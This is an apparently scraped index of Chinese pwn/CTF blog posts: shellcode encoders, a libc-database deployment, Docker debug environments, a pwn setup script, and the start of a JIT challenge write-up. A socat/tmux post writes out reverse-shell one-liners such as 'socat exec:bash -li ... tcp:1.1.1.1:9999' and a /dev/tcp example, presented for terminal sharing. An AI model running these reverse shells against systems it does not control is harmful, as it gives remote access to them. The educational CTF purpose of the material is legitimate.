./shellcode_x86.sh eax 学习原文地址在Alphanumeric Shellcode：纯字符Shellcode生成指南 - FreeBuf网络安全行业门户。 1-2-3 AE64\r另一位师傅写的可见字符编码的工具，地址在veritas501/ae64: basic amd64 alphanumeric shellcode encoder (github.com)，与上一个工具的比较如下： 以上两个工具都能生出x86/x64的shellcode，但是alpha3支持的选项更多一点，阅读两者的文档和使用示例即可熟练使用。 1-2-4 Shellcode Encoder\r指这个工具：rcx/shellcode_encoder: x64 printable shellcode encoder (github.com) 没有前两个好用，有限考虑前两个工具。 1-2-5 Msf生成\r很多编码的方式，但是对可见字符的编码支持受限。只有x86支持字符编码。 Framework Encoders [--encoder \u003cvalue\u003e] ====================================== Name Rank Description ---- ---- ----------- cmd/brace low Bash Brace Expansion Command Encoder cmd/echo good Echo Command Encoder cmd/generic_sh manual Generic Shell Variable Substitution Command Encoder cmd/ifs low Bourne ${IFS} Substitution Command Encoder cmd/perl normal Perl Command Encoder cmd/powershell_base64 excellent Powershell Base64 Command Encoder cmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encoder generic/eicar manual The EI","date":"2023-02-20","objectID":"/zh-cn/2023-02-20-the-art-of-shellcode/:0:0","tags":["shellcode","pwn"],"title":"Linux下的shellcode技巧总结","uri":"/zh-cn/2023-02-20-the-art-of-shellcode/"},{"categories":["tools","pwn-trick"],"content":" 为什么要自己搭建一个 libc database 呢，因为官方的https://libc.rip/api/查询接口挂了官方的查询接口时好时坏，现在又可以用了。 注意\r如果官方的接口可用，我就会暂时下线自己部署的接口 https://libc.roderickchan.cn。 如果你发现官方的接口用不了了，请及时联系(email)我，我会重启服务。 为什么要自己搭建一个libc database呢，因为写文章的时候官方的https://libc.rip/api/查询接口挂了。而我写的pwncli中的LibcBox依赖这个接口，挂了之后直接影响了LibcBox的使用。既然不能白嫖了，那不如自己动手搭建一个。自己动手，丰衣足食。 下载项目\r从niklasb/libc-database: Build a database of libc offsets to simplify exploitation (github.com)下载源码，下载后，先安装一下必备的软件包： sudo apt-get update \u0026\u0026 \\ sudo apt-get install -y \\ binutils file \\ wget \\ rpm2cpio cpio \\ zstd jq nodejs npm pip3 install elasticsearch==7.0.0 # 最好装这个版本的，否则会遇到很多奇怪的问题 安装结束后，先执行./get all然后等待一两分钟后直接Ctrl+C。不要等待这个操作执行完，该命令非常耗时，执行完大概要等一个小时左右。因此，可以先下载一部分用于测试。 文件修改\r域名\r直接使用vscode的全局替换，把所有的https://libc.rip替换为https://yourdomain.com。 Index\r然后对index.py修改如下： - es = Elasticsearch() + es = Elasticsearch(config.ES_HOST) Nginx.conf\r由于我本身就使用了nginx服务器，所以我把配置添加到/etc/nginx/nginx.conf。 记得申请证书并把证书放置在服务器上。 除此之外，可以修改docker-compose.yaml中的端口映射，避免端口冲突。 前端生成\r在libc-database/searchengine/frontend中执行： npm install npm run build 构建镜像\r使用在libc-database/searchengine，使用docker compose up -d构建镜像。 可以使用阿里云的镜像，替换/etc/sources.list和/etc/pip.conf。 生成索引\r在libc-database/searchengine执行python3 -m index ../db 接口测试\r测试查询接口： curl -X POST -H 'Content-Type: application/json' --data \\ '{\"symbols\": {\"strncpy\": \"db0\", \"strcat\": \"0x000000000d800\"}}' \\ 'https://yourdoamin.com/api/find' 无异常说明部署成功了。 访问https://yourdoamin.com访问前端页面。 全部更新\r测试接口没问题之后，在libc-database/searchengine，执行./update.sh。建议把update.sh修改为： #!/bin/bash cd \"$(dirname \"$0\")\" cd .. ./get all cd searchengine python3 -m index ../db 等待update.sh执行完成，就完事儿了。 访问我的\r点击：https://libc.roderickchan.cn可以在线查询 还可以使用下面的命令查询。 curl -X POST -H 'Content-Type: application/json' --data \\ '{\"symbols\": {\"system\": \"290\", \"puts\": \"0x000420\"}}' \\ 'https://libc.roderickchan.cn/api/find' 接口已同步更新到pwncli中，pwncli的使用方式为： from pwncli import * lb = LibcBox() lb.add_symbol('system', 0x290) lb.search() ","date":"2023-02-15","objectID":"/zh-cn/2023-02-15-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAlibc-database/:0:0","tags":["libc-database"],"title":"自己搭建一个libc database","uri":"/zh-cn/2023-02-15-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAlibc-database/"},{"categories":["pwn-trick","tools"],"content":" 介绍如何使用 docker 快速部署不同架构、不同版本的调试环境。给出 docker 环境下 pwn 题部署模板。 0x0 前言\r关于docker的基础概念不做过多的介绍。可以到Docker : Accelerated, Containerized Application Development官方网站上获取更多的信息。熟悉并使用docker的常用命令并不需要太多的时间。 在使用docker指令或者docker-compose的指令时，尽量到官方手册上查询有关指令的详情内容。 一般来说，使用docker-compose来运行多个容器，也可以集成编译镜像、运行实例等流程。 0x1 调试环境\r对于不同的版本，特别是传统的glibc的环境，有时候使用patchelf改变二进制文件的so无法得到与远程环境一样的内存布局，并且会缺乏调试符号。而对于部署在debian/fedora等其他操作系统上的程序，受到的影响会更大。因此，使用docker搭建一个一模一样的调试环境很有必要。 目前，我针对常用的环境制作了相关镜像，并发布在roderickchan/debug_pwn_env Tags | Docker Hub。 每个镜像都给出了 Ubuntu 的版本、其使用的 glibc libc.so.6 的具体版本（包括小版本）和镜像编译时间。 直接使用docker pull roderickchan/debug_pwn_env:22.04-2.35-0ubuntu3.1-20230213这样的命令拉取镜像即可。 拉取镜像后，运行命令如下： docker run -it --rm -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID # auto update docker run -it -rm -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID /bin/bash # do not update docker run -it --rm -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID # privileged enabled and auto update 可以映射宿主机端口和容器端口，映射文件或者目录。如果不带命令，容器会自动更新一些pwn相关的仓库和包，如果带上命令，就会执行指定的命令。 事实上这个镜像的Dockerfile如下： ARG BUILD_VERSION FROM ubuntu:$BUILD_VERSION ARG DEBIAN_FRONTEND=noninteractive ARG HUB_DOMAIN=github.com ARG NORMAL_USER_NAME=ctf ENV TZ=Etc/UTC ENV LANG en_US.UTF-8 ENV LANGUAGE en_US:en ENV LC_ALL en_US.UTF-8 WORKDIR /root RUN apt-get update \u0026\u0026 apt-get -y dist-upgrade \u0026\u0026 apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \\ xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim iputils-ping gdb-multiarch \\ file net-tools socat ruby ruby-dev locales autoconf automake libtool make \u0026\u0026 \\ gem install one_gadget \u0026\u0026 \\ gem install seccomp-tools \u0026\u0026 \\ sed -i '/en_US.UTF-8/s/^# //g' /etc/locale.gen \u0026\u0026 locale-gen # 先执行容易失败的操作 RUN git clone https://${HUB_DOMAIN}/pwndbg/pwndbg \u0026\u0026 \\ cd ./pwndbg \u0026\u0026 \\ ./setup.sh RUN git clone https://${HUB_DOMAIN}/NixOS/patchelf.git \u0026\u0026 \\ cd ./patchelf \u0026\u0026 \\ ./bootstrap.sh \u0026\u0026 \\ ./configure \u0026\u0026 \\ make \u0026\u0026 \\ make install RUN git clone https://${HUB_DOMAIN}/hugsy/gef.git \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/RoderickChan/Pwngdb.git \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/Gallopsled/pwntools \u0026\u0026 \\ (mv /usr/lib/python3.11/EXTERNALLY-MANAGED /usr/lib/python3.11/EXTERNALLY-MANAGED.old || true) \u0026\u0026 \\ pip3 install --upgrade --editable ./pwntools \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/RoderickChan/pwncli.git \u0026\u0026 \\ pip3 install --upgrade --editable ./pwncli COPY ./gdb-gef /bin COPY ./gdb-pwndbg /bin COPY ./update.sh /bin COPY ./test-this-container.sh /bin COPY ./.tmux.conf ./ COPY ./.gdbinit ./ COPY ./flag / COPY ./flag /flag.txt RUN chmod +x /bin/gdb-gef /bin/gdb-pwndbg /bin/update.sh /bin/test-this-container.sh \u0026\u0026 \\ echo \"root:root\" | chpasswd \u0026\u0026 \\ python3 -m pip install --upgrade pip \u0026\u0026 \\ pip3 install ropper capstone z3-solver qiling lief # normal user RUN useradd ${NORMAL_USER_NAME} -d /home/${NORMAL_USER_NAME} -m -s /bin/bash -u 1001 \u0026\u0026 \\ echo \"${NORMAL_USER_NAME}:${NORMAL_USER_NAME}\" | chpasswd \u0026\u0026 \\ cp -r /root/pwndbg /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp -r /root/gef /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp -r /root/pwntools /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp -r /root/Pwngdb /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp -r /root/pwncli /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp /root/.tmux.conf /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp /root/.gdbinit /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp /flag /home/${NORMAL_USER_NAME} \u0026\u0026 \\ cp /flag.txt /home/${NORMAL_USER_NAME} \u0026\u0026 \\ chown -R ${NORMAL_USER_NAME}:${NORMAL_USER_NAME} /home/${NORMAL_USER_NAME} USER ${NORMAL_USER_NAME}:${NORMAL_USER_NAME} WORKDIR /home/${NORMAL_USER_NAME} RUN pip3 install --upgrade --editable ./pwntools \u0026\u0026 \\ pip3 install --upgrade --editable ./pwncli # switch to root and install zsh USER root:root RUN apt-get install -y sudo zsh \u0026\u0026 \\ echo \"${NORMAL_USER_NAME} ALL=(ALL) NOPASSWD : ALL\" | tee /etc/sudoers.d/ctfsudo # switch 2 normal user USER ${NORMAL_USER_NAME}:${NORMAL_USER_NAME} WORKDIR /home/${NORMAL_USER_NAME} # install zs","date":"2023-02-13","objectID":"/zh-cn/2023-02-13-%E4%BD%BF%E7%94%A8docker%E8%B0%83%E8%AF%95pwn%E9%A2%98/:0:0","tags":["docker","pwn","gdb"],"title":"使用docker调试和部署pwn题","uri":"/zh-cn/2023-02-13-%E4%BD%BF%E7%94%A8docker%E8%B0%83%E8%AF%95pwn%E9%A2%98/"},{"categories":["tools","pwn-trick"],"content":" 使用socat得到一个带有pty的strong shell，然后使用tmux共享会话和结对编程。 Socat反弹shell\r反弹shell的原理并不复杂，需要建议的一点是，若是A弹shell给B，那么最好是B拥有公网IP，否则由A把程序和公网IP的端口绑定的话，任何人都能通过该端口访问到反弹的shell。 使用nc或者bash -i \u003e /dev/tcp/xxxx等的方式反弹的shell是没有tty的，那么使用Ctrl+C会退出程序，而不是给tty发送信号。同时，无法使用tmux分屏复用工具，无法使用自动补全功能等。 如果想要像ssh会话一样使用shell，就需要反弹一个带有tty的shell，可以借助socat来实现这一功能。 你弹给我\r我有公网IP，地址为：1.1.1.1 我在1.1.1.1机器上执行： socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork 你在自己的机器上执行： socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.1.1.1:9999 如果有zsh，反弹一个zsh也不错。 还可以把弹shell的操作，换成给一个容器docker run -it xxx /bin/sh，或者其他需要借助tty的操作。 我弹给你\r假如你有公网IP，把上面的流程反过来即可。 假如你没有公网IP，那么可以执行下面的操作。注意：下面的操作比较危险，不建议在公网上尝试。 我有公网IP，地址为：1.1.1.1 我在1.1.1.1机器上执行： socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork 你在自己的机器上执行： socat file:`tty`,raw,echo=0 tcp:1.1.1.1:9999 同时，还可以借助frp这样的反向代理工具，将公网IP当做跳板，把处于局域网机器的shell分享出去。 Tmux共享会话\rtmux是一款终端复用工具，非常好用，极力推荐~ 组会话\r新建一个公共会话，命名为groupSession。 tmux new -s groupSession 其他用户先登陆同一个账号，但不去直接连接这个会话，而是通过创建一个新的会话来加入上面的公共会话groupSession。 tmux new -t groupSession -s otherSession 此时两个用户都可以在同一个会话里操作，就会好像第二个用户连接到了groupSession的会话一样。此时两个用户都可以创建新建的窗口，新窗口的内容依然会实时同步，但是其中一个用户切换到其它窗口，对另外一个用户没有任何影响，因此在这个共享的组会话中，用户各自的操作可以通过新建窗口来执行。即使第二个用户关闭otherSession会话，共享会话groupSession依然存在。 组会话在共享的同时，又保留了相对的独立，非常适合结对编程场景，它是结对编程最简单的方式。 优点： 会话完全共享 既可以共享回话，又能保持相对独立。 缺点： 账号必须共享 组会话所需的权限会带来安全隐患 因此，建议只和比较熟悉的人一起使用组会话功能。 演示视频如下： Socket共享\r第一个用户指定一个socket文件来创建tmux session tmux -S /tmp/shared new-session -s shared 另一个用户通过这个socket文件来attach上会话，需要保证有相关权限，否则会因权限不足而报错。 # 可读可写 tmux -S /tmp/shared attach-session -t shared # 只读 tmux -S /tmp/shared attach-session -t shared -r 优点： 会话完全共享 不需要使用同一个账户 只需要控制创建的socket文件的权限即可 缺点： 之后加入的用户无法使用自己的配置文件 共享时无法创建独立窗口，所有人的会话都是完全一样的 演示视频如下： 合并使用\r使用场景\r什么时候需要使用socat反弹shell+tmux共享会话的操作呢？有下面这几种场景可以使用： 想和小伙伴一起分享终端上的操作，但是又不想给ssh账号，或者说不想把ssh暴露在公网上 不想用腾讯会议这样的软件进行共享（腾讯会议能看到的东西太多了） 想给对方分享如何调试程序，需要一个人操作，一个人看，比如一起打CTF 想帮对方安装软件 协调解决服务器上的问题 想和小伙伴一起在终端工作，同时又能知道对方的操作，比如一起打CTF ······ 如果想既要一起操作，又可以相对独立操作各自的窗口，那么就应该使用上面所提到的组会话功能。但之前提到了，组会话需要共享一个账号，也就是共享ssh的账户密码或者反弹一个自己的shell过去，如果双方并不熟悉，某一方要干坏事（比如种个马）的话，这种方式就会显得很不安全。因此，建议使用socket共享会话功能。下面所提到的都是socket共享回话的操作。 分享你的\r原则依旧是：A给B分享，B要有一个公网IP服务器。 我有公网IP，地址为：1.1.1.1 我在1.1.1.1机器上执行： # 监听9999端口 socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork 你在自己的机器上执行： # 打开两个终端窗口，第一个终端执行分割线之上的命令 # 创建会话 tmux -S /tmp/shared new-session -s shared #------------------------------------------------- # 第二个终端执行下面的命令 # 修改socket文件的权限 chmod o+rw /tmp/shared # 添加临时用户 sudo useradd tmpuser # 切换到临时用户并分享会话 sudo su -c \"socat exec:'tmux -S /tmp/shared attach-session -t shared',pty,stderr,setsid,sigint,sane tcp:1.1.1.1:9999\" tmpuser # 删除临时用户 sudo userdel tmpuser # 删除socket文件 /bin/rm /tmp/shared 分享我的\r与上面反弹shell类似。 假如你有公网IP，把上面的流程反过来即可。 假如你没有公网IP，那么可以执行下面的操作。注意：下面的操作比较危险，不建议在公网上尝试。 我有公网IP，地址为：1.1.1.1 我在1.1.1.1机器上执行： # 打开两个终端窗口，第一个终端执行分割线之上的命令 # 创建会话 tmux -S /tmp/shared new-session -s shared #------------------------------------------------- # 第二个终端执行下面的命令 # 修改socket文件的权限 chmod o+rw /tmp/shared # 添加临时用户 sudo useradd tmpuser # 切换到临时用户并分享会话 sudo su -c \"socat exec:'tmux -S /tmp/shared attach-session -t shared',pty,stderr,setsid,sigint,sane tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork\" tmpuser # 删除临时用户 sudo userdel tmpuser # 删除socket文件 /bin/rm /tmp/shared 你在自己的机器上执行： socat file:`tty`,raw,echo=0 tcp:1.1.1.1:9999 结束共享的时候，不要使用tmux detach，键入exit来结束。结束后记得删除socket文件。 一起操作\r如果不需要独立窗口，两边读写同步的话，则使用socket共享会话功能。 上面的操作默认都是读写同步的。 我做你看\r如果是你分享的会话，那么只需要把上面的分享你的的操作变为： 我有公网IP，地址为：1.1.1.1 我在1.1.1.1机器上执行： socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork 你在自己的机器上执行： # 打开两个终端窗口，第一个终端执行分割线之上的命令 # 创建会话 tmux -S /tmp/shared new-session -s shared #------------------------------------------------- # 第二个终端执行下面的命令 # 修改socket的权限 chmod o+rw /tmp/shared # 添加临时用户 sudo useradd tmpuser # 切换到临时用户并分享会话 sudo su -c \"socat exec:'tmux -S /tmp/shared attach-session -t shared -r',pty,stderr,setsid,sigint,sane tcp:1.1.1.1:9999\" tmpuser # 删除临时用户 sudo userde","date":"2023-02-10","objectID":"/zh-cn/2023-02-10-socat%E5%8F%8D%E5%BC%B9shell-tmux%E5%85%B1%E4%BA%AB%E4%BC%9A%E8%AF%9D/:0:0","tags":["tmux","socat"],"title":"socat反弹shell+tmux共享会话","uri":"/zh-cn/2023-02-10-socat%E5%8F%8D%E5%BC%B9shell-tmux%E5%85%B1%E4%BA%AB%E4%BC%9A%E8%AF%9D/"},{"categories":["pwn-trick"],"content":" 分享在ubuntu系统上一站式搭建pwn环境的脚本。 安装脚本如下，挂着梯子的情况下可以直接使用国外的官方源，建议安装的ubuntu系统版本至少为ubuntu:18.04，用可使用sudo命令的普通用户安装而不建议直接使用root用户安装。 如果无法访问国外的源，建议替换apt源和pip源为国内的源，替换脚本内的HUB_DOMAIN环境变量，使得域名指向国内镜像。 另外，国内源安装zsh或者执行某些wget命令可能会失败。 因此，非常建议开着全局代理执行这个安装脚本。 #!/bin/bash # 环境变量 export DEBIAN_FRONTEND=noninteractive export TZ=Asia/Shanghai export HUB_DOMAIN=github.com # 基础包 sudo apt update \u0026\u0026 sudo apt install -y --fix-missing python3 python3-pip python3-dev lib32z1 \\ xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \\ vim netcat iputils-ping cpio gdb-multiarch file net-tools socat ruby ruby-dev locales \\ autoconf automake libtool make zsh openssh-server openssh-client ipython3 \\ gdb-multiarch bison # qemu相关, 需要的话取消注释 # sudo apt install qemu qemu-system qemu-user-static binfmt-support # ruby包 sudo gem install one_gadget seccomp-tools # python包 python3 -m pip install --upgrade pip \u0026\u0026 \\ pip3 install ropper capstone unicorn keystone-engine z3-solver qiling lief libnum pycryptodome angr trash-cli \u0026\u0026 \\ cd $HOME export HUB_DOMAIN=github.com git clone https://${HUB_DOMAIN}/pwndbg/pwndbg \u0026\u0026 \\ cd ./pwndbg \u0026\u0026 \\ ./setup.sh \u0026\u0026 \\ cd $HOME \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/hugsy/gef.git \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/RoderickChan/Pwngdb.git \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/Gallopsled/pwntools \u0026\u0026 \\ pip3 install --upgrade --editable ./pwntools \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/RoderickChan/pwncli.git \u0026\u0026 \\ pip3 install --upgrade --editable ./pwncli \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/marin-m/vmlinux-to-elf.git \u0026\u0026 \\ git clone https://${HUB_DOMAIN}/JonathanSalwan/ROPgadget.git \u0026\u0026 \\ python3 ./ROPgadget/setup.py install # 安装patchelf和r2 git clone https://${HUB_DOMAIN}/NixOS/patchelf.git \u0026\u0026 \\ cd ./patchelf \u0026\u0026 \\ ./bootstrap.sh \u0026\u0026 \\ ./configure \u0026\u0026 \\ make \u0026\u0026 \\ sudo make install \u0026\u0026 \\ cd $HOME \u0026\u0026 \\ export version=$(curl -s https://api.github.com/repos/radareorg/radare2/releases/latest | grep -P '\"tag_name\": \"(.*)\"' -o| awk '{print $2}' | awk -F\"\\\"\" '{print $2}') \u0026\u0026 \\ wget https://${HUB_DOMAIN}/radareorg/radare2/releases/download/${version}/radare2_${version}_amd64.deb \u0026\u0026 \\ sudo dpkg -i radare2_${version}_amd64.deb \u0026\u0026 rm radare2_${version}_amd64.deb # 配置tmux文件 git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm cat \u003e ~/.tmux.conf \u003c\u003c \"EOF\" # C-b即Ctrl+b键，unbind意味着解除绑定 unbind C-b # 绑定Ctrl+a为新的指令前缀 set -g prefix C-a # 从tmux v1.6版起，支持设置第二个指令前缀, 设置一个不常用的`键作为指令前缀，按键更快 set-option -g prefix2 ` # 关闭自动重命名 setw -g automatic-rename off # 禁止活动进程修改窗口名 setw -g allow-rename off # 使用vi风格 setw -g mode-keys vi # 是否开启鼠标支持 # set-option -g mouse on # --------------------from tmux_plugins/sensible------------------------------- # Address vim mode switching delay (http://superuser.com/a/252717/65504) set -s escape-time 0 # Increase scrollback buffer size from 2000 to 50000 lines set -g history-limit 50000 # Increase tmux messages display duration from 750ms to 4s set -g display-time 4000 # Refresh 'status-left' and 'status-right' more often, from every 15s to 5s set -g status-interval 5 # Upgrade $TERM set -g default-terminal \"screen-256color\" # Emacs key bindings in tmux command prompt (prefix + :) are better than # vi keys, even for vim users #set -g status-keys emacs # Focus events enabled for terminals that support them set -g focus-events on # Super useful when using \"grouped sessions\" and multi-monitor setup setw -g aggressive-resize on # 修改分屏快捷键 unbind '\"' bind - splitw -v -c '#{pane_current_path}' # 垂直方向新增面板，默认进入当前目录 unbind % bind | splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录 # 设置面板大小调整快捷键 bind j resize-pane -D 5 bind k resize-pane -U 5 bind h resize-pane -L 5 bind l resize-pane -R 5 # 刷新配置文件 bind R run-shell \"tmux source-file ~/.tmux.conf\" # 上一个窗口 bind a last-window # 配置插件 setenv -g TMUX_PLUGIN_MANAGER_PATH '~/.tmux/plugins' set -g @plugin 'tmux-plugins/tpm' set -g @plugin 'seebi/tmux-colors-solarized' set -g @plugin 'tmux-plugins/tmux-resurrect' set -g @plugin 'tmux-plugins/tmux-continuum' run '~/.tmux/plugins/tpm/tpm' E","date":"2023-02-10","objectID":"/zh-cn/2023-02-10-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/:0:0","tags":["pwn"],"title":"pwn环境搭建脚本","uri":"/zh-cn/2023-02-10-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/"},{"categories":["tools"],"content":" 鉴于notepad++的作者总是发表降智言论，抵制notepad++，从我做起。 前言\r虽然notepad++在同款软件中很好用，但由于其作者经常公开发表不当的政治言论，支持台独分子，因此，我们必须对该作者的行为予以谴责，对notepad++予以抵制。 前段时间，notepad++的作者声称其会在软件中新增一个功能：如果软件使用者不同意他的政治观点，notepad++会在源代码中随机添加任意字符。 尽管其后续称以上言论是一个玩笑，但这种解释却无法令人信服。 notepad++虽然好用，但并非不可替代！ 常用的编程 IDE 中，vscode 是生产力工具，但太过笨重，没有必要为了查看/编辑/搜索一个配置文件打开 vscode，特别是在安装了很多插件的情况下。因此，需要像 notepad++ 这样轻量级的文本处理工具。 在网上搜索一番后，结合使用体验，发现cudatext这款软件很不错，在此推荐此软件并记录使用过程。 安装\r可以访问官网CudaText - Home查看cudatext的介绍，然后到CudaText - Browse /release at SourceForge.net下载最新版的安装包。我平常在windows平台上使用，所以我下载的是cudatext-windows-amd64-1.183.0.0.zip，下载后解压即可使用。 若是由于网络原因导致下载缓慢的话，可以从cudatext-windows-amd64-1.183.0.0.zip下载离线包，从CudaText_addons.zip下载插件包。 插件\r到CudaText - Browse /addons_all at SourceForge.net下载插件，插件下载后，解压，然后依次点击file-\u003eOpen file操作打开插件即可安装。插件安装时可以批量选择。 如果需要卸载插件，从Plugins-\u003e Addons-manager-\u003eRemove add-on卸载即可。 从上面链接下载的插件包是全部的插件包，在查看了每一个插件的描述后，我整理了一个建议版的插件包，可以从cudatext_addon_suggestion.7z下载。下载，安装插件时直接 Ctrl+A全部选择。 cudatext的插件也都是很轻量的，我装了60多个插件后，运行cudatext的内存占用不超过30 MB，和vscode动辄几百兆的内存占用相比，显得尤为轻便。 这款编辑器主要使用python，想要自己写插件的话，可以访问CudaText API - Free Pascal wiki阅读API。然后实现所需功能即可。 ","date":"2023-02-08","objectID":"/zh-cn/2023-02-08-%E4%BD%BF%E7%94%A8cudatext%E6%9B%BF%E4%BB%A3notepad/:0:0","tags":["cudatext"],"title":"使用cudatext替代notepad++","uri":"/zh-cn/2023-02-08-%E4%BD%BF%E7%94%A8cudatext%E6%9B%BF%E4%BB%A3notepad/"},{"categories":["pwn-wp"],"content":" 一道JIT的题，记录一下。点击链接下载附件。 实现了一个简单的JIT引擎，并翻译了少量的字节码。 字节码：自定义的程序码，一般需要编译器翻译为机器码后再执行 机器码：cpu可以直接执行的程序码 题目分析\r主要关注四个类和一个容器： JITHelper实现一些辅助功能，如初始化，写入机器码到rwx区域、结束清理 Compile实现编译、解析、执行等功能 IRStream实现字节码的读取和程序计数 AsmHelper将字节码翻译为机器码 map容器Compiler::funcs根据id存储每个函数的信息 Compile::main\r程序主要逻辑开始于Compiler::main函数，大概流程梳理如下。 初始化阶段，exec区域全部初始化为0xcc。 接着，往exec区域拷贝了语句，拷贝后区域的汇编代码如下： 0x7f7113500000 lea rbp, [rsp - 8] 0x7f7113500005 call 0x7f711350000b 然后，在Compiler::handleFn中处理字节码。 处理完之后，在JITHelper::finailize会把exec区域权限改为r-x。 然后进行检查：Compiler::funcs必须存在id为0的函数，函数的args必须为0，id为0的函数必须第一个读入。不满足就退出执行。 接着，清零低地址的栈 最后，执行处于exec区域，翻译得到的机器码 Comile::handleFn\r在一个循环中，使用Compiler::handleFn读取函数。 每个函数有三个信息： id：唯一标识符 args：参数个数 locals：本地变量个数 创建函数的字节码如下： 0xff id args locals 其中，args \u003c= 8，locals \u003c= 0x20。 创建完成后，往exec区域写入： sub rsp, locals * 8 然后进入到Compiler::handleFnBody函数处理函数体。 最后调用AsmHelper::func_ret插入函数退出的机器码： add rsp, 8 * locals lea rdi, [rbp + retvar] mov rsi, [rdi] mov rax, rsi ret Compile::handleFnBody\r处理函数体。整理如下。 var2reg: lea rdi, [rbp + var] mov rsi, [rdi] pvar2reg: lea rdi, [rbp + var] regassign: mov [rdi], rsi regaruth(0x21): and [rdi],rsi regaruth(0x9): or [rdi],rsi regaruth(0x31): xor [rdi],rsi opcode 0x0: xx -\u003e var2idx(xx1) var return var 0x1: 往栈上写值 b_xx -\u003e var2idx(xx1) var q_num # 8个字节 mov rsi, q_num lea rdi, [rbp + var] mov [rdi], rsi 0x2: 栈上值转移 b_xx_1 -\u003e var2idx(xx1) var1 b_xx_2 -\u003e var2idx(xx2) var2 lea rdi, [rbp + var1] mov rsi, [rdi] lea rdi, [rbp + var2] mov [rdi], rsi 0x3: b_xx_1 -\u003e var2idx(xx1) var1 b_xx_2 -\u003e var2idx(xx2) var2 lea rdi, [rbp + var2] mov rsi, [rdi] lea rdi, [rbp + var1] and [rdi], rsi 0x4: b_xx_1 -\u003e var2idx(xx1) var1 b_xx_2 -\u003e var2idx(xx2) var2 lea rdi, [rbp + var2] mov rsi, [rdi] lea rdi, [rbp + var1] or [rdi], rsi 0x5: b_xx_1 -\u003e var2idx(xx1) var1 b_xx_2 -\u003e var2idx(xx2) var2 lea rdi, [rbp + var2] mov rsi, [rdi] lea rdi, [rbp + var1] xor [rdi], rsi 0x6: b_xx_1 -\u003e id b_xx_2 -\u003e var2idx(xx2) retvar b_xx_3 -\u003e args b_xx_n \u003c- len(args) for x in xx_n: var2idx(xx_x) --\u003e b_var_n push rbp sub rsp, 0x8 * len(args) for i, x in args: lea rdi, [rbp + x] mov rsi, [rdi] mov [rsp + -8 * i], rsi lea rbp, [rsp - 8] jmp id(func) pop rbp mov rsi, rax lea rdi, [rbp + retvar] mov [rdi], rsi 其中，由于题目限制，0x6字节码分支无法使用。只需要关注其他字节码即可。var2idx函数也需要关注。 Compiler::var2idx\r该函数用于限制lea rdi, [rbp +XX]语句中的XX的范围。 当args \u003c= 8 \u0026\u0026 locals \u003c= 0x20的时候，XX范围为[-0x80, 0x40]，写个脚本打印出来： var: 0x1, 8 * variable: 0x8 var: 0x2, 8 * variable: 0x10 var: 0x3, 8 * variable: 0x18 var: 0x4, 8 * variable: 0x20 var: 0x5, 8 * variable: 0x28 var: 0x6, 8 * variable: 0x30 var: 0x7, 8 * variable: 0x38 var: 0x8, 8 * variable: 0x40 var: 0x81, -8 * variable: -0x8 var: 0x82, -8 * variable: -0x10 var: 0x83, -8 * variable: -0x18 var: 0x84, -8 * variable: -0x20 var: 0x85, -8 * variable: -0x28 var: 0x86, -8 * variable: -0x30 var: 0x87, -8 * variable: -0x38 var: 0x88, -8 * variable: -0x40 var: 0x89, -8 * variable: -0x48 var: 0x8a, -8 * variable: -0x50 var: 0x8b, -8 * variable: -0x58 var: 0x8c, -8 * variable: -0x60 var: 0x8d, -8 * variable: -0x68 var: 0x8e, -8 * variable: -0x70 var: 0x8f, -8 * variable: -0x78 var: 0x90, -8 * variable: -0x80 var: 0xa0, -8 * variable: 0 利用思路\r随便写个函数让JIT翻译执行，然后执行的时候看下栈的情况： pwndbg\u003e stack 30 00:0000│ rsp 0x7fff30421010 ◂— 0x0 01:0008│ 0x7fff30421018 ◂— 0x0 02:0010│ 0x7fff30421020 ◂— 0x0 03:0018│ 0x7fff30421028 ◂— 0x0 04:0020│ 0x7fff30421030 ◂— 0x0 05:0028│ 0x7fff30421038 ◂— 0x0 06:0030│ 0x7fff30421040 ◂— 0x0 07:0038│ 0x7fff30421048 ◂— 0x0 08:0040│ 0x7fff30421050 ◂— 0x0 09:0048│ 0x7fff30421058 ◂— 0x0 0a:0050│ 0x7fff30421060 ◂— 0x0 0b:0058│ 0x7fff30421068 ◂— 0x0 0c:0060│ 0x7fff30421070 ◂— 0x0 0d:0068│ 0x7fff30421078 ◂— 0x0 0e:0070│ rdi 0x7fff30421080 —▸ 0x7fff304210a7 